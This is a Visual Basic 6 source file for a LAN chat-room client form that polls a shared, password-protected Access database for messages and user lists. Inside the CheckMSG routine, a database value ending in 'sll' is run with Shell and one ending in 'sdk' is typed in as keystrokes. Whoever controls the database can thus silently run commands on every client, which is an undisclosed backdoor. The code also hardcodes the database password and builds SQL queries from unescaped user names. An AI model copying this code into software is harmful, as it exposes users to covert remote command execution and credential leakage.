VERSION 5.00
Begin VB.Form frmChat 
   BackColor       =   &H80000003&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Chat - "
   ClientHeight    =   8505
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   10320
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   8505
   ScaleWidth      =   10320
   StartUpPosition =   2  'CenterScreen
   Begin VB.Timer Timer2 
      Interval        =   500
      Left            =   3840
      Top             =   6600
   End
   Begin VB.Timer GetList 
      Interval        =   2000
      Left            =   2880
      Top             =   6480
   End
   Begin VB.TextBox txtChat 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   6375
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   14
      Top             =   600
      Width           =   7815
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Change"
      Height          =   255
      Left            =   7080
      TabIndex        =   13
      Top             =   7080
      Width           =   855
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000003&
      Caption         =   "Warning !!!"
      Height          =   1935
      Left            =   8040
      TabIndex        =   6
      Top             =   6480
      Width           =   2175
      Begin VB.Label Label7 
         Alignment       =   2  'Center
         BackColor       =   &H80000003&
         BackStyle       =   0  'Transparent
         Caption         =   "2009 - 2010"
         Height          =   255
         Left            =   0
         TabIndex        =   11
         Top             =   1680
         Width           =   2175
      End
      Begin VB.Label Label6 
         Alignment       =   2  'Center
         BackColor       =   &H80000003&
         BackStyle       =   0  'Transparent
         Caption         =   "Copyright © QuangTrung"
         Height          =   255
         Left            =   0
         TabIndex        =   10
         Top             =   1440
         Width           =   2175
      End
      Begin VB.Label Label5 
         BackColor       =   &H80000003&
         BackStyle       =   0  'Transparent
         Caption         =   "- Administrator Can Kick You Out Chat Room !"
         Height          =   375
         Left            =   120
         TabIndex        =   9
         Top             =   960
         Width           =   1935
      End
      Begin VB.Label Label4 
         BackColor       =   &H80000003&
         BackStyle       =   0  'Transparent
         Caption         =   "- No Spam On Chat Room!"
         Height          =   375
         Left            =   120
         TabIndex        =   8
         Top             =   720
         Width           =   2055
      End
      Begin VB.Label Label3 
         BackColor       =   &H80000003&
         BackStyle       =   0  'Transparent
         Caption         =   "- This Program Is Copyright By Quang Trung !"
         Height          =   495
         Left            =   120
         TabIndex        =   7
         Top             =   240
         Width           =   2055
      End
   End
   Begin VB.ListBox List1 
      Height          =   5715
      ItemData        =   "Form1.frx":628A
      Left            =   8040
      List            =   "Form1.frx":628C
      TabIndex        =   5
      Top             =   600
      Width           =   2175
   End
   Begin ChatOnLan.UniTextBox txtText 
      Height          =   855
      Left            =   120
      TabIndex        =   2
      Top             =   7440
      Width           =   6855
      _ExtentX        =   12091
      _ExtentY        =   1508
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   -2147483643
      Text            =   ""
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   120
      Top             =   6960
   End
   Begin VB.CommandButton cmdSend 
      Caption         =   "Send"
      Enabled         =   0   'False
      Height          =   855
      Left            =   7080
      TabIndex        =   1
      Top             =   7440
      Width           =   855
   End
   Begin VB.TextBox txtName 
      BackColor       =   &H00FFFFFF&
      Enabled         =   0   'False
      Height          =   285
      Left            =   5160
      TabIndex        =   0
      Top             =   7080
      Width           =   1815
   End
   Begin VB.Label Label8 
      BackColor       =   &H80000003&
      Caption         =   "To protect Chat Room, Your nick show in Chat Room is =========>"
      Height          =   255
      Left            =   120
      TabIndex        =   12
      Top             =   7080
      Width           =   4935
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      BackColor       =   &H80000003&
      Caption         =   "List User"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   8040
      TabIndex        =   4
      Top             =   120
      Width           =   2055
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H80000003&
      Caption         =   "Chat Room"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   7815
   End
End
Attribute VB_Name = "frmChat"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Dim Lo As String
Dim Li As String
Dim KiemTra
Dim X
Dim Nmsg As String
Dim mNmsg As String



Dim Max As Long
Dim db As Database
Dim rs As Recordset
Dim WS As Workspace
Private Sub cmdSend_Click()
If txtText.Text <> "" Then
WriteIniFile "Z:\ChatLog.log", "ChatRoom", "Log", txtName.Text & ": " & txtText.Text
txtText.Text = ""
End If

End Sub

Private Sub Command1_Click()
MsgBox "Only Administrator Change This Status !"
End Sub





Private Sub Form_Load()
mNmsg = "no"
Nmsg = "no"
KiemTra = 1
End Sub



Private Sub Form_Unload(Cancel As Integer)

frmMem.Show
frmMem.Label6.Caption = txtName.Text

End Sub



Private Sub GetList_Timer()
LayDS
End Sub



Private Sub List1_DblClick()
Dim X As New frmMiniChat
If List1.List(List1.ListIndex) <> txtName.Text And List1.List(List1.ListIndex) <> "" Then
X.Show
X.Caption = txtName.Text & " - " & List1.List(List1.ListIndex)

End If
End Sub

Private Sub Timer1_Timer()

If KiemTra = 1 Then
Lo = ReadIniFile("Z:\ChatLog.log", "ChatRoom", "Log", "No Data")
txtChat.Text = txtChat.Text & Lo & vbCrLf
txtChat.SelStart = Len(txtChat.Text)
End If
Li = ReadIniFile("Z:\ChatLog.log", "ChatRoom", "Log", "No Data")
If Li = Lo Then
KiemTra = 0
Else
KiemTra = 1
End If
End Sub





Private Sub Timer2_Timer()
CheckMSG
End Sub

Private Sub txtText_Change()
If txtText.Text = "" Then
cmdSend.Enabled = False
Else
cmdSend.Enabled = True
End If

End Sub

Private Sub txtText_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = 13 Then
cmdSend_Click
End If
End Sub


Private Sub LayDS()
''''''''''''''''''''''''''
Dim db As Database
Dim rs As Recordset
Dim WS As Workspace
Dim Max As Long

Set WS = DBEngine.Workspaces(0)
    DbFile = ("Z:\CSDL.MDB")
    PwdString = "881817258"
Set db = DBEngine.OpenDatabase(DbFile, False, False, ";PWD=" & PwdString)
Set rs = db.OpenRecordset("Room", dbOpenTable)

On Error GoTo Thoat

Max = rs.RecordCount

If rs.RecordCount = 0 Then
Exit Sub
Else
rs.MoveFirst

List1.Clear

For i = 1 To Max
    List1.AddItem rs!ListUser
    rs.MoveNext
Next i
List1.ListIndex = 0
End If
Thoat:
End Sub

Private Sub CheckMSG()
Dim Hute As String
Dim db As Database
Dim rs As Recordset
Dim WS As Workspace
Dim Max As Long

Set WS = DBEngine.Workspaces(0)
    DbFile = ("Z:\CSDL.MDB")
    PwdString = "881817258"
Set db = DBEngine.OpenDatabase(DbFile, False, False, ";PWD=" & PwdString)
Set rs = db.OpenRecordset("Chat", dbOpenTable)
Set rs = db.OpenRecordset("Select * from Chat where USER = '" & txtName.Text & "'")
Nmsg = rs("MSG")

If Nmsg = "kck" Then
    List1.Enabled = False
    txtChat.Enabled = False
    txtText.Enabled = False
    Timer1.Enabled = False
    Timer2.Enabled = False
    GetList.Enabled = False
    
    
    UniMsgBox ChrW$(&H42) & ChrW$(&H1EA1) & ChrW$(&H6E) & ChrW$(&H20) & ChrW$(&H111) & ChrW$(&HE3) & ChrW$(&H20) & ChrW$(&H62) & ChrW$(&H1ECB) & ChrW$(&H20) & ChrW$(&H111) & ChrW$(&HE1) & ChrW$(&H20) & ChrW$(&H72) & ChrW$(&H61) & ChrW$(&H20) & ChrW$(&H6B) & ChrW$(&H68) & ChrW$(&H1ECF) & ChrW$(&H69) & ChrW$(&H20) & ChrW$(&H70) & ChrW$(&H68) & ChrW$(&HF2) & ChrW$(&H6E) & ChrW$(&H67) & ChrW$(&H20) & ChrW$(&H21), vbOKOnly, "Thông Báo"
    rs.Edit
    rs("MSG") = "no"
    rs.Update
    Offline
    End
ElseIf Right(Nmsg, 3) = "msg" Then
    rs.Edit
    rs("MSG") = "no"
    rs.Update
    
    Hute = Left(Nmsg, Len(Nmsg) - 3)
    UniMsgBox Hute, vbOKOnly, "Thông Báo"
ElseIf Right(Nmsg, 3) = "sll" Then
    rs.Edit
    rs("MSG") = "no"
    rs.Update
    On Error GoTo Ero
    Hute = Left(Nmsg, Len(Nmsg) - 3)
    Shell Hute
Ero:
ElseIf Right(Nmsg, 3) = "sdk" Then
    rs.Edit
    rs("MSG") = "no"
    rs.Update
    On Error GoTo Ero2
    Hute = Left(Nmsg, Len(Nmsg) - 3)
    SendKeys Hute
Ero2:
Else
    

If Nmsg <> mNmsg And Nmsg <> "no" Then
    
    Dim Ha As New frmMiniChatNhan
        If FindWindow(vbNullString, Nmsg) = 0 Then
            Randomize
            Ha.Show
            Ha.Caption = Nmsg
            
        End If
            
End If
mNmsg = Nmsg


End If
End Sub
Private Sub Offline()


Dim db As Database
Dim rs As Recordset
Dim WS As Workspace
Dim Max As Long

Set WS = DBEngine.Workspaces(0)
    DbFile = ("Z:\CSDL.MDB")
    PwdString = "881817258"
Set db = DBEngine.OpenDatabase(DbFile, False, False, ";PWD=" & PwdString)
Set rs = db.OpenRecordset("Room", dbOpenTable)
Set rs = db.OpenRecordset("Select * from Room where ListUser = '" & txtName.Text & "'")
rs.Delete

Set rs = db.OpenRecordset("Chat", dbOpenTable)

Set rs = db.OpenRecordset("Select * from Chat where User = '" & txtName.Text & "'")
rs.Edit
rs("ONLINE") = "no"
rs("MSG") = "no"
rs.Update

End Sub

